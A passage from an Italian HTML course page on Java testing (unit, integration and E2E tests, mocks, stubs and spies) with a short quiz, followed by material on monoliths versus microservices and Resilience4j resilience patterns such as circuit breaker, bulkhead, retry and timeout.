    private PriceCalculator calculator;

    @Test
    void shouldApplyDiscountBeforeTax() {
        // Given
        Product product = new Product("Laptop", new BigDecimal("1000.00"));
        Customer customer = new Customer("IT");

        when(discountService.getDiscount(customer))
            .thenReturn(new BigDecimal("0.10")); // 10% discount

        when(taxService.calculateTax(eq(new BigDecimal("900.00")), eq("IT")))
            .thenReturn(new BigDecimal("198.00")); // 22% IVA

        // When
        BigDecimal finalPrice = calculator.calculateFinalPrice(product, customer);

        // Then
        assertThat(finalPrice).isEqualByComparingTo(new BigDecimal("1098.00"));

        // Verify interaction order
        InOrder inOrder = inOrder(discountService, taxService);
        inOrder.verify(discountService).getDiscount(customer);
        inOrder.verify(taxService).calculateTax(any(), any());
    }

    @Test
    void shouldHandleZeroDiscount() {
        // Given
        Product product = new Product("Mouse", new BigDecimal("50.00"));
        Customer customer = new Customer("IT");

        when(discountService.getDiscount(customer)).thenReturn(BigDecimal.ZERO);
        when(taxService.calculateTax(any(), any())).thenReturn(new BigDecimal("11.00"));

        // When
        BigDecimal finalPrice = calculator.calculateFinalPrice(product, customer);

        // Then
        assertThat(finalPrice).isEqualByComparingTo(new BigDecimal("61.00"));
    }
}</code></pre>

                <h3>Integration Tests</h3>

                <p>Gli <strong>Integration Tests</strong> verificano che più componenti funzionino correttamente <strong>insieme</strong>. Tipicamente testano l'interazione tra il codice applicativo e sistemi esterni (database, message broker, API esterne).</p>

                <pre><code class="language-java">// Integration Test con Spring Boot e database reale (H2/TestContainers)
@SpringBootTest
@Transactional  // Rollback automatico dopo ogni test
class OrderServiceIntegrationTest {

    @Autowired
    private OrderService orderService;

    @Autowired
    private OrderRepository orderRepository;

    @Autowired
    private CustomerRepository customerRepository;

    @Test
    void shouldPersistOrderWithItems() {
        // Given
        Customer customer = customerRepository.save(
            new Customer("Mario Rossi", "mario@example.com")
        );

        CreateOrderRequest request = CreateOrderRequest.builder()
            .customerId(customer.getId())
            .items(List.of(
                new OrderItemRequest("PROD-001", 2),
                new OrderItemRequest("PROD-002", 1)
            ))
            .build();

        // When
        Order order = orderService.createOrder(request);

        // Then
        assertThat(order.getId()).isNotNull();
        assertThat(order.getItems()).hasSize(2);

        // Verify persistence
        Order persistedOrder = orderRepository.findById(order.getId()).orElseThrow();
        assertThat(persistedOrder.getCustomer().getName()).isEqualTo("Mario Rossi");
        assertThat(persistedOrder.getStatus()).isEqualTo(OrderStatus.CREATED);
    }

    @Test
    void shouldPublishEventWhenOrderCreated() {
        // Test che verifica l'integrazione con il message broker
        // ...
    }
}

// Integration Test con TestContainers (database reale)
@SpringBootTest
@Testcontainers
class OrderRepositoryIntegrationTest {

    @Container
    static PostgreSQLContainer<?> postgres = new PostgreSQLContainer<>("postgres:15")
        .withDatabaseName("testdb")
        .withUsername("test")
        .withPassword("test");

    @DynamicPropertySource
    static void configureProperties(DynamicPropertyRegistry registry) {
        registry.add("spring.datasource.url", postgres::getJdbcUrl);
        registry.add("spring.datasource.username", postgres::getUsername);
        registry.add("spring.datasource.password", postgres::getPassword);
    }

    @Autowired
    private OrderRepository orderRepository;

    @Test
    void shouldFindOrdersByCustomerWithNativeQuery() {
        // Test di query complesse con database reale PostgreSQL
        // ...
    }
}</code></pre>

                <h3>E2E (End-to-End) Tests</h3>

                <p>I test <strong>E2E</strong> verificano l'intero flusso applicativo dal punto di vista dell'utente, attraversando tutti i layer (UI → API → Database → External Services).</p>

                <pre><code class="language-java">// E2E Test con REST Assured
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class OrderApiE2ETest {

    @LocalServerPort
    private int port;

    @Autowired
    private CustomerRepository customerRepository;

    @BeforeEach
    void setUp() {
        RestAssured.port = port;
        RestAssured.basePath = "/api/v1";
    }

    @Test
    void completeOrderFlow() {
        // 1. Create customer
        String customerId = given()
            .contentType(ContentType.JSON)
            .body("""
                {
                    "name": "Mario Rossi",
                    "email": "mario@example.com"
                }
                """)
            .when()
            .post("/customers")
            .then()
            .statusCode(201)
            .extract()
            .path("id");

        // 2. Create order
        String orderId = given()
            .contentType(ContentType.JSON)
            .body("""
                {
                    "customerId": "%s",
                    "items": [
                        {"productId": "PROD-001", "quantity": 2}
                    ]
                }
                """.formatted(customerId))
            .when()
            .post("/orders")
            .then()
            .statusCode(201)
            .body("status", equalTo("CREATED"))
            .extract()
            .path("id");

        // 3. Pay order
        given()
            .contentType(ContentType.JSON)
            .body("""
                {
                    "paymentMethod": "CREDIT_CARD",
                    "cardToken": "tok_visa_success"
                }
                """)
            .when()
            .post("/orders/{orderId}/pay", orderId)
            .then()
            .statusCode(200)
            .body("status", equalTo("PAID"));

        // 4. Verify final state
        given()
            .when()
            .get("/orders/{orderId}", orderId)
            .then()
            .statusCode(200)
            .body("status", equalTo("PAID"))
            .body("paymentDate", notNullValue());
    }
}</code></pre>

                <table>
                    <thead>
                        <tr>
                            <th>Caratteristica</th>
                            <th>Unit Test</th>
                            <th>Integration Test</th>
                            <th>E2E Test</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Scope</strong></td>
                            <td>Singola classe/metodo</td>
                            <td>Più componenti insieme</td>
                            <td>Intero sistema</td>
                        </tr>
                        <tr>
                            <td><strong>Dipendenze</strong></td>
                            <td>Tutte mockate</td>
                            <td>Alcune reali (DB, broker)</td>
                            <td>Tutte reali</td>
                        </tr>
                        <tr>
                            <td><strong>Velocità</strong></td>
                            <td>Millisecondi</td>
                            <td>Secondi</td>
                            <td>Minuti</td>
                        </tr>
                        <tr>
                            <td><strong>Feedback</strong></td>
                            <td>Specifico (quale metodo fallisce)</td>
                            <td>Moderato</td>
                            <td>Generico (qualcosa è rotto)</td>
                        </tr>
                        <tr>
                            <td><strong>Flakiness</strong></td>
                            <td>Quasi zero</td>
                            <td>Bassa</td>
                            <td>Alta</td>
                        </tr>
                        <tr>
                            <td><strong>Quando usare</strong></td>
                            <td>Logica di business</td>
                            <td>Interazioni con DB/broker</td>
                            <td>Critical user journeys</td>
                        </tr>
                    </tbody>
                </table>
            </section>

            <!-- Mocking vs Stubbing Section -->
            <section class="section" id="modulo2-mocking">
                <h2>Mocking vs Stubbing</h2>

                <p>Questa distinzione è fondamentale e spesso confusa. <strong>Mock</strong> e <strong>Stub</strong> sono entrambi "Test Doubles" (sostituti di dipendenze reali), ma hanno scopi diversi.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        TEST DOUBLES TAXONOMY                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                           Test Double                                       │
│                               │                                             │
│         ┌─────────┬───────────┼───────────┬─────────┐                       │
│         │         │           │           │         │                       │
│         ▼         ▼           ▼           ▼         ▼                       │
│      ┌──────┐ ┌──────┐   ┌────────┐  ┌───────┐ ┌───────┐                    │
│      │ Dummy│ │ Fake │   │  Stub  │  │  Spy  │ │  Mock │                    │
│      └──────┘ └──────┘   └────────┘  └───────┘ └───────┘                    │
│         │         │           │           │         │                       │
│         │         │           │           │         │                       │
│    Placeholder  Working   Returns     Records   Verifies                    │
│    (never used) implem.   canned      calls +   behavior                    │
│                 (in-mem   answers     delegates (expectations)              │
│                  DB)                  to real                               │
│                                                                             │
│  ═══════════════════════════════════════════════════════════════════════    │
│                                                                             │
│                   STATE VERIFICATION                                        │
│                   ──────────────────                                        │
│                   Stub, Fake                                                │
│                   "Given this input, return this output"                    │
│                   Test verifica il RISULTATO                                │
│                                                                             │
│                   BEHAVIOR VERIFICATION                                     │
│                   ────────────────────                                      │
│                   Mock, Spy                                                 │
│                   "Verify this method was called with these args"           │
│                   Test verifica le INTERAZIONI                              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Stub: State Verification</h3>

                <p>Uno <strong>Stub</strong> fornisce risposte predefinite alle chiamate. Non verifica come viene usato, solo che il sistema under test produca il risultato corretto dato quell'input.</p>

                <pre><code class="language-java">// STUB - Fornisce risposte predefinite
@Test
void shouldCalculateTotalWithDiscount_usingStub() {
    // Stub: definiamo solo COSA ritorna, non ci interessa COME viene chiamato
    DiscountService discountStub = new DiscountService() {
        @Override
        public BigDecimal getDiscount(Customer customer) {
            return new BigDecimal("0.15"); // Sempre 15%
        }
    };

    PriceCalculator calculator = new PriceCalculator(discountStub, taxService);

    // State verification: verifico solo il RISULTATO finale
    BigDecimal result = calculator.calculateFinalPrice(product, customer);
    assertThat(result).isEqualByComparingTo(expectedPrice);

    // NON verifichiamo se/come getDiscount() è stato chiamato
}

// Con Mockito: when() crea uno STUB
@Test
void shouldCalculateTotalWithDiscount_usingMockitoStub() {
    // Questo è tecnicamente uno STUB, anche se usiamo @Mock
    when(discountService.getDiscount(any())).thenReturn(new BigDecimal("0.15"));

    BigDecimal result = calculator.calculateFinalPrice(product, customer);

    assertThat(result).isEqualByComparingTo(expectedPrice);
    // Nessun verify() = state verification
}</code></pre>

                <h3>Mock: Behavior Verification</h3>

                <p>Un <strong>Mock</strong> è un oggetto pre-programmato con aspettative sulle chiamate che riceverà. Il test fallisce se le aspettative non vengono soddisfatte.</p>

                <pre><code class="language-java">// MOCK - Verifica il comportamento/interazioni
@Test
void shouldNotifyWarehouseWhenOrderPlaced_usingMock() {
    // Given
    Order order = new Order(customer, List.of(item1, item2));

    // Mock: ci interessa verificare CHE venga chiamato e COME
    WarehouseService warehouseMock = mock(WarehouseService.class);
    OrderService orderService = new OrderService(warehouseMock);

    // When
    orderService.placeOrder(order);

    // Behavior verification: verifichiamo le INTERAZIONI
    verify(warehouseMock).reserveStock(order.getItems());
    verify(warehouseMock, times(1)).scheduleShipment(order);
    verify(warehouseMock, never()).cancelReservation(any());

    // Verifica dell'ordine delle chiamate
    InOrder inOrder = inOrder(warehouseMock);
    inOrder.verify(warehouseMock).reserveStock(any());
    inOrder.verify(warehouseMock).scheduleShipment(any());
}

// Argument Captor per verifiche più sofisticate
@Test
void shouldSendCorrectEmailContent() {
    // Given
    ArgumentCaptor&lt;Email&gt; emailCaptor = ArgumentCaptor.forClass(Email.class);

    // When
    userService.registerUser(newUser);

    // Then - cattura l'argomento passato al mock
    verify(emailService).send(emailCaptor.capture());

    Email sentEmail = emailCaptor.getValue();
    assertThat(sentEmail.getTo()).isEqualTo(newUser.getEmail());
    assertThat(sentEmail.getSubject()).contains("Welcome");
    assertThat(sentEmail.getBody()).contains(newUser.getName());
}</code></pre>

                <div class="info-box warning">
                    <h4>Quando usare Mock vs Stub?</h4>
                    <ul>
                        <li><strong>Usa Stub</strong> quando ti interessa solo il risultato (es: calcoli, trasformazioni, query)</li>
                        <li><strong>Usa Mock</strong> quando ti interessa verificare che un side-effect avvenga (es: email inviata, evento pubblicato, audit log scritto)</li>
                        <li><strong>Evita over-mocking</strong>: se ti trovi a verificare ogni singola chiamata, probabilmente stai testando l'implementazione invece del comportamento</li>
                    </ul>
                </div>

                <h3>Spy: Il meglio di entrambi i mondi</h3>

                <p>Uno <strong>Spy</strong> avvolge un oggetto reale, permettendo di tracciare le chiamate e opzionalmente sovrascrivere alcuni metodi.</p>

                <pre><code class="language-java">@Test
void shouldUseRealImplementationButTrackCalls() {
    // Spy su implementazione reale
    List&lt;String&gt; realList = new ArrayList&lt;&gt;();
    List&lt;String&gt; spyList = spy(realList);

    // Usa implementazione reale
    spyList.add("one");
    spyList.add("two");

    // Ma possiamo verificare le chiamate
    verify(spyList).add("one");
    verify(spyList, times(2)).add(anyString());

    // E sovrascrivere comportamenti specifici
    doReturn(100).when(spyList).size();
    assertThat(spyList.size()).isEqualTo(100); // Stubbed
    assertThat(spyList.get(0)).isEqualTo("one"); // Real
}</code></pre>
            </section>

            <!-- Quiz Section Module 2 -->
            <section class="quiz-section" id="modulo2-quiz">
                <h2>Interactive Challenge Quiz - Testing</h2>
                <p style="color: var(--text-secondary); margin-bottom: 30px;">Verifica la tua comprensione delle strategie di testing.</p>

                <!-- Question 6 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q1.</span> Un test verifica che quando un utente si registra, viene inviata un'email di conferma. Quale tipo di test double è più appropriato per <code>EmailService</code>?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q6" id="q6a" value="a">
                            <label for="q6a"><strong>Stub</strong> - configuro EmailService per ritornare <code>true</code> quando chiamato</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q6" id="q6b" value="b">
                            <label for="q6b"><strong>Mock</strong> - verifico che <code>emailService.send()</code> sia stato chiamato con i parametri corretti</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q6" id="q6c" value="c">
                            <label for="q6c"><strong>Fake</strong> - uso un'implementazione in-memory che salva le email in una lista</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q6" id="q6d" value="d">
                            <label for="q6d"><strong>Spy</strong> - avvolgo il vero EmailService per tracciare le chiamate senza mockare</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q6')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q6"></div>
                </div>

                <!-- Question 7 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q2.</span> Quale delle seguenti affermazioni sulla Test Pyramid è CORRETTA?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q7" id="q7a" value="a">
                            <label for="q7a">I test E2E dovrebbero coprire il 70-80% della codebase perché verificano il comportamento reale dell'utente</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q7" id="q7b" value="b">
                            <label for="q7b">Gli Integration Test sono più affidabili degli Unit Test perché non usano mock</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q7" id="q7c" value="c">
                            <label for="q7c">I test E2E sono più "flaky" (instabili) perché dipendono da più componenti e fattori esterni</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q7" id="q7d" value="d">
                            <label for="q7d">Nel TDD, tutti i test devono essere scritti prima di iniziare a scrivere codice di produzione</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q7')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q7"></div>
                </div>

                <!-- Question 8 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q3.</span> Stai testando un <code>PaymentService</code> che chiama un gateway esterno. Il test deve verificare che venga applicato un retry in caso di fallimento temporaneo. Qual è l'approccio migliore?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q9" id="q9a" value="a">
                            <label for="q9a">Uso un Mock del gateway che fallisce le prime 2 chiamate e poi succede, verificando che <code>process()</code> sia chiamato 3 volte</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q9" id="q9b" value="b">
                            <label for="q9b">Uso un test E2E con un gateway di staging che simula fallimenti</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q9" id="q9c" value="c">
                            <label for="q9c">Uso uno Stub che ritorna sempre successo, verificando solo il risultato finale</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q9" id="q9d" value="d">
                            <label for="q9d">Non è possibile testare la retry logic in modo isolato, serve sempre un Integration Test</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q9')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q9"></div>
                </div>

                <!-- Question 10 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q4.</span> Quale test ha la maggior probabilità di essere "flaky" (fallire in modo intermittente)?</h4>
                    <pre><code class="language-java">// Test A
@Test void testA() {
    when(repo.findById(1L)).thenReturn(Optional.of(user));
    assertThat(service.getUser(1L)).isEqualTo(user);
}

// Test B
@Test void testB() {
    User saved = userRepository.save(new User("test@mail.com"));
    await().atMost(5, SECONDS).until(() ->
        searchService.findByEmail("test@mail.com") != null);
}

// Test C
@Test void testC() {
    assertThat(calculator.add(2, 3)).isEqualTo(5);
}

// Test D
@Test void testD() {
    User user = userRepository.save(new User("mario"));
    assertThat(userRepository.findById(user.getId())).isPresent();
}</code></pre>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q10" id="q10a" value="a">
                            <label for="q10a">Test A - perché usa mock che potrebbero non corrispondere alla realtà</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q10" id="q10b" value="b">
                            <label for="q10b">Test B - perché dipende da timing/eventual consistency con <code>await()</code></label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q10" id="q10c" value="c">
                            <label for="q10c">Test C - perché i calcoli matematici possono avere problemi di floating point</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q10" id="q10d" value="d">
                            <label for="q10d">Test D - perché l'ID generato potrebbe collidere con dati esistenti</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q10')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q10"></div>
                </div>
            </section>

            <!-- ==================== MODULO 3: ARCHITETTURA & SCALABILITÀ ==================== -->

            <header class="module-header" id="modulo3" style="margin-top: 80px;">
                <span class="module-tag">Modulo 3</span>
                <h1>Architettura & Scalabilità</h1>
                <p>Pattern architetturali, resilienza e strategie per sistemi distribuiti ad alta disponibilità</p>
            </header>

            <!-- Monolith vs Microservices Section -->
            <section class="section" id="modulo3-monolith-micro">
                <h2>Monoliti vs Microservizi</h2>

                <p>La scelta tra architettura monolitica e microservizi è una delle decisioni più importanti nella progettazione di un sistema. Non esiste una risposta universale: dipende dal contesto, dal team e dalla fase del prodotto.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    MONOLITH vs MICROSERVICES                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   MONOLITH                              MICROSERVICES                       │
│   ────────                              ─────────────                       │
│                                                                             │
│   ┌─────────────────────┐               ┌───────┐ ┌───────┐ ┌───────┐      │
│   │                     │               │ User  │ │ Order │ │ Pay   │      │
│   │   ┌─────────────┐   │               │Service│ │Service│ │Service│      │
│   │   │   Web UI    │   │               └───┬───┘ └───┬───┘ └───┬───┘      │
│   │   └─────────────┘   │                   │         │         │          │
│   │   ┌─────────────┐   │                   │    ┌────┴────┐    │          │
│   │   │  Business   │   │                   └────┤ Message ├────┘          │
│   │   │   Logic     │   │                        │  Broker │               │
│   │   └─────────────┘   │                        └────┬────┘               │
│   │   ┌─────────────┐   │               ┌───────┐ ┌───┴───┐ ┌───────┐      │
│   │   │  Data Layer │   │               │  DB   │ │  DB   │ │  DB   │      │
│   │   └─────────────┘   │               │ User  │ │ Order │ │ Pay   │      │
│   │                     │               └───────┘ └───────┘ └───────┘      │
│   └──────────┬──────────┘                                                  │
│              │                                                             │
│        ┌─────┴─────┐                                                       │
│        │    DB     │                                                       │
│        └───────────┘                                                       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Monolith: Pro e Contro</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Pro</th>
                            <th>Contro</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Semplicità di sviluppo e deploy</td>
                            <td>Scaling solo verticale (o replica intera)</td>
                        </tr>
                        <tr>
                            <td>Transazioni ACID semplici</td>
                            <td>Codebase che cresce e diventa ingestibile</td>
                        </tr>
                        <tr>
                            <td>Debugging e tracing più facile</td>
                            <td>Un bug può bloccare tutto il sistema</td>
                        </tr>
                        <tr>
                            <td>Nessun overhead di rete interno</td>
                            <td>Technology lock-in (un solo stack)</td>
                        </tr>
                        <tr>
                            <td>Team piccoli, startup, MVP</td>
                            <td>Deploy richiede rilascio di tutto</td>
                        </tr>
                    </tbody>
                </table>

                <h3>Microservices: Pro e Contro</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Pro</th>
                            <th>Contro</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Scaling indipendente per servizio</td>
                            <td>Complessità operativa elevata</td>
                        </tr>
                        <tr>
                            <td>Deploy indipendenti</td>
                            <td>Latenza di rete tra servizi</td>
                        </tr>
                        <tr>
                            <td>Fault isolation (un servizio fallisce, altri continuano)</td>
                            <td>Transazioni distribuite complesse (Saga pattern)</td>
                        </tr>
                        <tr>
                            <td>Team autonomi, ownership chiara</td>
                            <td>Debugging distribuito difficile</td>
                        </tr>
                        <tr>
                            <td>Polyglot (linguaggi/DB diversi)</td>
                            <td>Overhead: service discovery, API gateway, observability</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box warning">
                    <h4>Domanda trabocchetto ai colloqui</h4>
                    <p>"Quando useresti i microservizi?"<br><br>
                    <strong>Risposta NON banale:</strong> Non "quando l'applicazione è grande". I microservizi sono giustificati quando hai: (1) team multipli che devono lavorare indipendentemente, (2) parti del sistema con requisiti di scaling molto diversi, (3) necessità di deploy frequenti e indipendenti, (4) volontà di investire in infrastruttura (CI/CD, monitoring, service mesh). Per una startup o un MVP, un monolite ben strutturato è quasi sempre la scelta migliore.</p>
                </div>

                <h3>Modular Monolith: Il compromesso</h3>

                <p>Un <strong>Modular Monolith</strong> combina i vantaggi di entrambi: deploy singolo ma con boundaries chiari tra moduli, preparando una futura migrazione a microservizi se necessario.</p>

                <pre><code class="language-java">// Struttura Modular Monolith
com.myapp/
├── user/
│   ├── api/           // Interfacce pubbliche del modulo
│   │   └── UserApi.java
│   ├── internal/      // Implementazione (package-private)
│   │   ├── UserService.java
│   │   └── UserRepository.java
│   └── UserModule.java
├── order/
│   ├── api/
│   │   └── OrderApi.java
│   ├── internal/
│   │   ├── OrderService.java
│   │   └── OrderRepository.java
│   └── OrderModule.java
└── payment/
    └── ...

// Regola: i moduli comunicano SOLO tramite API pubbliche
// MAI accesso diretto a classi internal di altri moduli

// ArchUnit test per enforcare i boundaries
@Test
void modulesShouldNotDependOnInternalPackages() {
    classes()
        .that().resideInAPackage("..order..")
        .should().onlyAccessClassesThat()
        .resideOutsideOfPackage("..user.internal..")
        .check(importedClasses);
}</code></pre>
            </section>

            <!-- Resilience Patterns Section -->
            <section class="section" id="modulo3-resilience">
                <h2>Resilience Patterns</h2>

                <p>Nei sistemi distribuiti, i fallimenti sono inevitabili. I pattern di resilienza permettono al sistema di degradare gracefully invece di fallire completamente.</p>

                <h3>Circuit Breaker Pattern</h3>

                <p>Il <strong>Circuit Breaker</strong> previene chiamate ripetute a un servizio che sta fallendo, permettendogli di recuperare e proteggendo il sistema da cascade failures.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                      CIRCUIT BREAKER STATE MACHINE                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                         ┌─────────────────┐                                 │
│                         │                 │                                 │
│     Failure threshold   │     CLOSED      │   Normal operation              │
│     reached             │   (allowing)    │   Requests pass through         │
│          ┌──────────────│                 │                                 │
│          │              └────────┬────────┘                                 │
│          │                       │                                          │
│          │                       │ Success                                  │
│          │                       │ (reset counter)                          │
│          │                       │                                          │
│          ▼                       │                                          │
│   ┌──────────────┐               │                                          │
│   │              │               │                                          │
│   │    OPEN      │───────────────┘                                          │
│   │  (blocking)  │                                                          │
│   │              │   Timeout expires                                        │
│   └──────┬───────┘   (e.g., 30 seconds)                                     │
│          │                                                                  │
│          │                                                                  │
│          ▼                                                                  │
│   ┌──────────────┐                                                          │
│   │              │                                                          │
│   │  HALF-OPEN   │   Allow limited requests                                 │
│   │  (testing)   │   to test if service recovered                           │
│   │              │                                                          │
│   └──────┬───────┘                                                          │
│          │                                                                  │
│    ┌─────┴─────┐                                                            │
│    │           │                                                            │
│    ▼           ▼                                                            │
│ Success     Failure                                                         │
│    │           │                                                            │
│    │           └──────► Back to OPEN                                        │
│    │                                                                        │
│    └──────────────────► Back to CLOSED                                      │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// Implementazione con Resilience4j
@Configuration
public class CircuitBreakerConfig {

    @Bean
    public CircuitBreakerRegistry circuitBreakerRegistry() {
        CircuitBreakerConfig config = CircuitBreakerConfig.custom()
            .failureRateThreshold(50)           // Apre se 50% fallimenti
            .slowCallRateThreshold(50)          // Apre se 50% chiamate lente
            .slowCallDurationThreshold(Duration.ofSeconds(2))
            .waitDurationInOpenState(Duration.ofSeconds(30))
            .permittedNumberOfCallsInHalfOpenState(5)
            .slidingWindowSize(10)              // Ultimi 10 risultati
            .slidingWindowType(SlidingWindowType.COUNT_BASED)
            .build();

        return CircuitBreakerRegistry.of(config);
    }
}

@Service
public class PaymentService {

    private final CircuitBreaker circuitBreaker;
    private final PaymentGateway paymentGateway;

    public PaymentService(CircuitBreakerRegistry registry, PaymentGateway gateway) {
        this.circuitBreaker = registry.circuitBreaker("paymentGateway");
        this.paymentGateway = gateway;
    }

    public PaymentResult processPayment(PaymentRequest request) {
        return circuitBreaker.executeSupplier(() ->
            paymentGateway.process(request)
        );

        // Oppure con fallback
        return CircuitBreaker.decorateSupplier(circuitBreaker,
            () -> paymentGateway.process(request))
            .recover(CallNotPermittedException.class,
                e -> PaymentResult.serviceUnavailable())
            .recover(TimeoutException.class,
                e -> PaymentResult.timeout())
            .get();
    }
}

// Con annotation (Spring Boot + resilience4j-spring-boot2)
@Service
public class PaymentService {

    @CircuitBreaker(name = "paymentGateway", fallbackMethod = "fallbackPayment")
    public PaymentResult processPayment(PaymentRequest request) {
        return paymentGateway.process(request);
    }

    private PaymentResult fallbackPayment(PaymentRequest request, Exception e) {
        log.warn("Payment gateway unavailable, using fallback", e);
        return PaymentResult.queued(); // Metti in coda per retry successivo
    }
}</code></pre>

                <h3>Bulkhead Pattern</h3>

                <p>Il <strong>Bulkhead</strong> (paratia) isola le risorse tra diversi tipi di chiamate, prevenendo che un singolo servizio lento esaurisca tutte le risorse.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         BULKHEAD PATTERN                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   SENZA BULKHEAD                    CON BULKHEAD                            │
│   ──────────────                    ────────────                            │
│                                                                             │
│   ┌─────────────────────┐           ┌─────────────────────┐                 │
│   │   Thread Pool (20)  │           │    Order Service    │                 │
│   │                     │           │   Thread Pool (10)  │                 │
│   │ ████████████████████│           │   ██████████        │                 │
│   │ (all used by slow   │           └─────────────────────┘                 │
│   │  Payment service)   │                                                   │
│   │                     │           ┌─────────────────────┐                 │
│   │ Other services      │           │   Payment Service   │                 │
│   │ BLOCKED! ⛔         │           │   Thread Pool (5)   │                 │
│   └─────────────────────┘           │   █████ (saturated) │                 │
│                                     └─────────────────────┘                 │
│   Se Payment è lento,                                                       │
│   TUTTO si blocca                   ┌─────────────────────┐                 │
│                                     │   User Service      │                 │
│                                     │   Thread Pool (5)   │                 │
│                                     │   ██                │ ← Still works!  │
│                                     └─────────────────────┘                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// Bulkhead con Resilience4j
@Service
public class OrderService {

    @Bulkhead(name = "orderService", type = Bulkhead.Type.THREADPOOL)
    public CompletableFuture&lt;Order&gt; createOrderAsync(OrderRequest request) {
        return CompletableFuture.supplyAsync(() -> processOrder(request));
    }

    @Bulkhead(name = "orderService", type = Bulkhead.Type.SEMAPHORE,
              fallbackMethod = "fallbackCreateOrder")
    public Order createOrder(OrderRequest request) {
        return processOrder(request);
    }

    private Order fallbackCreateOrder(OrderRequest request, BulkheadFullException e) {
        throw new ServiceOverloadedException("Order service is overloaded, try again later");
    }
}

// application.yml
resilience4j:
  bulkhead:
    instances:
      orderService:
        maxConcurrentCalls: 20          # Semaphore bulkhead
        maxWaitDuration: 500ms
  thread-pool-bulkhead:
    instances:
      orderService:
        maxThreadPoolSize: 10           # Thread pool bulkhead
        coreThreadPoolSize: 5
        queueCapacity: 20</code></pre>

                <h3>Retry Pattern con Exponential Backoff</h3>

                <pre><code class="language-java">// Retry con Resilience4j
@Service
public class ExternalApiService {

    @Retry(name = "externalApi", fallbackMethod = "fallback")
    public Response callExternalApi(Request request) {
        return externalClient.call(request);
    }

    private Response fallback(Request request, Exception e) {
        log.error("All retries failed for request: {}", request, e);
        throw new ExternalServiceException("Service unavailable after retries", e);
    }
}

// application.yml
resilience4j:
  retry:
    instances:
      externalApi:
        maxAttempts: 3
        waitDuration: 1s
        enableExponentialBackoff: true
        exponentialBackoffMultiplier: 2    # 1s, 2s, 4s
        retryExceptions:
          - java.io.IOException
          - java.util.concurrent.TimeoutException
        ignoreExceptions:
          - com.myapp.BusinessException     # Non ritentare errori business</code></pre>

                <h3>Timeout Pattern</h3>

                <pre><code class="language-java">// Timeout con Resilience4j
@Service
public class SlowService {

    @TimeLimiter(name = "slowService", fallbackMethod = "timeoutFallback")
    public CompletableFuture&lt;Result&gt; slowOperation() {
        return CompletableFuture.supplyAsync(() -> {
            // Operazione potenzialmente lenta
            return performSlowOperation();
        });
    }

    private CompletableFuture&lt;Result&gt; timeoutFallback(TimeoutException e) {
        return CompletableFuture.completedFuture(Result.timeout());
    }
}

// application.yml
resilience4j:
  timelimiter:
    instances:
      slowService:
        timeoutDuration: 5s
        cancelRunningFuture: true</code></pre>

                <div class="info-box success">
                    <h4>Combinare i pattern</h4>
                    <p>I pattern di resilienza si combinano spesso insieme. L'ordine tipico è:<br>
                    <code>Retry → CircuitBreaker → Bulkhead → TimeLimiter</code><br><br>
                    Con Resilience4j puoi stackare le annotation:</p>
                </div>

                <pre><code class="language-java">@CircuitBreaker(name = "backend")
@Bulkhead(name = "backend")
@Retry(name = "backend")
@TimeLimiter(name = "backend")
